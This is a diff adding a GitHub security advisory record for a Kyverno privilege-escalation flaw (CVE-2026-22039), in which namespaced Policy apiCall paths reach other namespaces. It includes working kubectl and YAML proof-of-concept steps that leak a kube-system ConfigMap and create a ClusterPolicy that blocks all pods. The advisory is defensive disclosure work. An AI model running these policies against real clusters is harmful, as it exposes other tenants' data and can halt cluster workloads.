@@ -1,0 +1,76 @@
+{
+  "id": "GHSA-8p9x-46gm-qfx2",
+  "modified": "2026-01-27T18:26:25.146454Z",
+  "published": "2026-01-27T18:01:26Z",
+  "aliases": [
+    "CVE-2026-22039"
+  ],
+  "summary": "Kyverno Cross-Namespace Privilege Escalation via Policy apiCall",
+  "details": "### Summary\n\nA critical authorization boundary bypass in namespaced Kyverno Policy [apiCall](https://kyverno.io/docs/policy-types/cluster-policy/external-data-sources/#url-paths). The resolved `urlPath` is executed using the Kyverno admission controller ServiceAccount, with no enforcement that the request is limited to the policy’s namespace.\n\nAs a result, any authenticated user with permission to create a namespaced Policy can cause Kyverno to perform Kubernetes API requests using Kyverno’s admission controller identity, targeting any API path allowed by that ServiceAccount’s RBAC. This breaks namespace isolation by enabling cross-namespace reads (for example, ConfigMaps and, where permitted, Secrets) and allows cluster-scoped or cross-namespace writes (for example, creating ClusterPolicies) by controlling the urlPath through context variable substitution.\n\n### Details\n\nThe vulnerability exists in how Kyverno handles `apiCall` context entries. The code substitutes variables into the `URLPath` field without sanitizing the output or validating that the resulting path is authorized for the scope of the policy.\n\n1.  In `pkg/engine/apicall/apiCall.go`, the `Fetch` method performs variable substitution on the entire `APICall` object, including the `URLPath`.\n    ```go\n    // pkg/engine/apicall/apiCall.go\n    func (a *apiCall) Fetch(ctx context.Context) ([]byte, error) {\n        // Variable substitution happens here\n        call, err := variables.SubstituteAllInType(a.logger, a.jsonCtx, a.entry.APICall)\n        // ...\n        data, err := a.Execute(ctx, \u0026call.APICall)\n    ```\n\n2.  In `pkg/engine/apicall/executor.go`, the `Execute` method delegates to `executeK8sAPICall`, which passes the raw path directly to the Kubernetes client's `RawAbsPath` method.\n    ```go\n    // pkg/engine/apicall/executor.go\n    func (a *executor) executeK8sAPICall(ctx context.Context, path string, method kyvernov1.Method, ...) ([]byte, error) {\n        // ...\n        // Path is used directly in the raw API call\n        jsonData, err := a.client.RawAbsPath(ctx, path, string(method), requestData)\n    ```\n\nBecause `RawAbsPath` executes a direct HTTP request to the API server using Kyverno's admission controller service account (which typically has broad permissions), an attacker can construct any valid API path to access and mutate resources they shouldn't have access to.\n\n### PoC 001 - Data exfiltration\nThe following steps demonstrate how a user restricted to the `default` namespace (with no access to `kube-system`) can read a sensitive ConfigMap from the `kube-system` namespace.\n\n**0. Setup kind + Kyverno**\n\nTested with Kyverno v1.16.1 on k8s v1.34.0.\n\n```bash\nkind create cluster\nhelm repo add kyverno https://kyverno.github.io/kyverno/\nhelm repo update\nhelm install kyverno kyverno/kyverno -n kyverno --create-namespace\n```\n\n**1. Setup target and low-privileged user**\nCreate a confidential resource in a privileged namespace, and create a restricted user `policy-admin` who only has permissions to manage policies in the `default` namespace.\n```bash\n# Create confidential data in kube-system\nkubectl create configmap target-cm -n kube-system --from-literal=key=confidential-data\n\n# Create a restricted service account\nkubectl create sa policy-admin -n default\n\n# Create a role for managing policies and configmaps in default namespace only\nkubectl create role policy-admin-role -n default \\\n  --verb=create,get,list,update,delete \\\n  --resource=policies.kyverno.io,configmaps\n\n# Bind the role to the service account\nkubectl create rolebinding policy-admin-binding -n default \\\n  --role=policy-admin-role \\\n  --serviceaccount=default:policy-admin\n\n# Verify the user cannot access kube-system\nkubectl auth can-i get configmaps -n kube-system --as=system:serviceaccount:default:policy-admin\n# Output: no\n```\n\n**2. Create malicious policy as the restricted user**\nImpersonating the restricted user `policy-admin`, apply a namespaced `Policy` in the `default` namespace.\n```yaml\ncat \u003c\u003cEOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -\napiVersion: kyverno.io/v1\nkind: Policy\nmetadata:\n  name: cross-ns-leak\n  namespace: default\nspec:\n  validationFailureAction: Enforce\n  rules:\n  - name: leak-config\n    match:\n      resources:\n        kinds:\n        - ConfigMap\n    context:\n    - name: leakedData\n      apiCall:\n        # Injection happens here via annotations\n        urlPath: \"/api/v1/namespaces/{{request.object.metadata.annotations.target_ns}}/configmaps/{{request.object.metadata.annotations.target_name}}\"\n        jmesPath: \"data.key\"\n    validate:\n      # The leaked data is returned in the denial message\n      message: \"LEAKED DATA: {{leakedData}}\"\n      deny: {}\nEOF\n```\n\n**3. Trigger the leak**\nAs the restricted user, create a ConfigMap in the `default` namespace with annotations pointing to the target resource in `kube-system`.\n```yaml\ncat \u003c\u003cEOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: trigger-leak\n  namespace: default\n  annotations:\n    target_ns: \"kube-system\"\n    target_name: \"target-cm\"\ndata: {}\nEOF\n```\n\n**4. Result**\nThe creation request is denied, but the error message contains the secret data from `kube-system`, proving the privilege escalation.\n\n```\nError from server: error when creating \"STDIN\": admission webhook \"validate.kyverno.svc-fail\" denied the request: \n\nresource ConfigMap/default/trigger-leak was blocked due to the following policies \n\ncross-ns-leak:\n  leak-config: 'LEAKED DATA: confidential-data'\n```\n\n### PoC 002 - ClusterPolicy injection\n\nContinue from the setup from the previous PoC.\n\nThis vulnerability also allows creation of cluster-level resources. For example, a low-privileged user can create a `ClusterPolicy` that impacts the entire cluster. In this PoC, a low-privileged user creates a cluster policy, which prevents scheduling of pods.\n\n**1. Apply a malicious policy**\n\n```yaml\ncat \u003c\u003cEOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -\napiVersion: kyverno.io/v1\nkind: Policy\nmetadata:\n  name: mutation-cpol\n  namespace: default\nspec:\n  validationFailureAction: Enforce\n  rules:\n  - name: create-malicious-cpol\n    match:\n      resources:\n        kinds:\n        - ConfigMap\n    context:\n    - name: mutation\n      apiCall:\n        urlPath: \"/apis/kyverno.io/v1/clusterpolicies\"\n        method: POST\n        data:\n        - key: apiVersion\n          value: \"kyverno.io/v1\"\n        - key: kind\n          value: \"ClusterPolicy\"\n        - key: metadata\n          value:\n            name: \"malicious-cpol\"\n        - key: spec\n          value:\n            validationFailureAction: Enforce\n            rules:\n            - name: block-all\n              match:\n                resources:\n                  kinds:\n                  - Pod\n              validate:\n                message: \"Blocked by malicious policy\"\n                deny: {}\n    validate:\n      message: \"Created ClusterPolicy: {{mutation.metadata.name}}\"\n      deny: {}\nEOF\n```\n\n**2. Trigger the policy**\n\n```bash\ncat \u003c\u003cEOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: trigger-cpol\n  namespace: default\ndata: {}\nEOF\n```\n\nThis outputs an error:\n\n```\nError from server: error when creating \"STDIN\": admission webhook \"validate.kyverno.svc-fail\" denied the request:\n\nresource ConfigMap/default/trigger-cpol was blocked due to the following policies\n\nmutation-cpol:\n  create-malicious-cpol: \"\"\n```\n\n**3. Observe the new cluster policy**\n\n```bash\nkubectl get clusterpolicy malicious-cpol\n```\n\nOutputs:\n\n```\nNAME             ADMISSION   BACKGROUND   READY   AGE     MESSAGE\nmalicious-cpol   true        true         True    4m58s   Ready\n```\n\n**4. Verify that no new pods can be created (even as a cluster admin)**\n\nRun:\n\n```\nkubectl run --image=nginx foo\n```\n\nOutputs:\n\n```\nError from server: admission webhook \"validate.kyverno.svc-fail\" denied the request:\n\nresource Pod/default/foo was blocked due to the following policies\n\nmalicious-cpol:\n  block-all: Blocked by malicious policy\n```\n### Impact\n\n- Users with `Policy` creation rights in a single namespace can escalate privileges (context of Kyverno admission controller).\n- Since `apiCall` supports `POST`, attackers can potentially create resources in privileged namespaces (e.g., creating a RoleBinding in `kube-system` to grant themselves cluster-admin) if the Kyverno service account has write permissions.\n- Attackers can disrupt the entire cluster by creating a malicious `ClusterPolicy` that blocks critical operations (e.g., preventing Pod scheduling), as demonstrated in PoC #2.\n- Sensitive data (Secrets, tokens, configuration) can be exfiltrated from any namespace, depending on the RBAC.\n- In shared clusters, one tenant can read data belonging to other tenants or the cluster administration.\n\nThe following command should be run on a per-environment basis to understand impact:\n\n```\nkubectl auth can-i --as=system:serviceaccount:kyverno:kyverno-admission-controller --list\n```\n\nBy default, this does not include Secrets. \n\n\n### Mitigation\n\nThe `apiCall` logic should enforce that `Policy` resources (namespaced policies) can only access resources within the same namespace. If a `Policy` attempts to access a resource in a different namespace via `urlPath`, the request should be blocked. `ClusterPolicy` resources are unaffected by this restriction as they are intended to operate cluster-wide.\n\nThe mitigation logic validates the `urlPath` for namespaced policies by ensuring:\n1. The path explicitly contains the `/namespaces/\u003cnamespace\u003e/` segment.\n2. The namespace in the path matches the policy's namespace.\n3. Requests missing the namespace segment (targeting cluster-scoped resources) or targeting a different namespace are rejected.\n\nThis effectively prevents both the cross-namespace data leak and the creation of cluster-scoped resources (like `ClusterPolicy`) or resources in other namespaces via the `POST` method.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/kyverno/kyverno",
+        "purl": "pkg:golang/github.com/kyverno/kyverno"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.15.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-8p9x-46gm-qfx2/GHSA-8p9x-46gm-qfx2.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/kyverno/kyverno",
+        "purl": "pkg:golang/github.com/kyverno/kyverno"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.16.0-rc.1"
+            },
+            {
+              "fixed": "1.16.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-8p9x-46gm-qfx2/GHSA-8p9x-46gm-qfx2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-8p9x-46gm-qfx2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kyverno/kyverno/commit/e0ba4de4f1e0ca325066d5095db51aec45b1407b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kyverno/kyverno/commit/eba60fa856c781bcb9c3be066061a3df03ae4e3e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kyverno/kyverno"
+    }
+  ]
+}
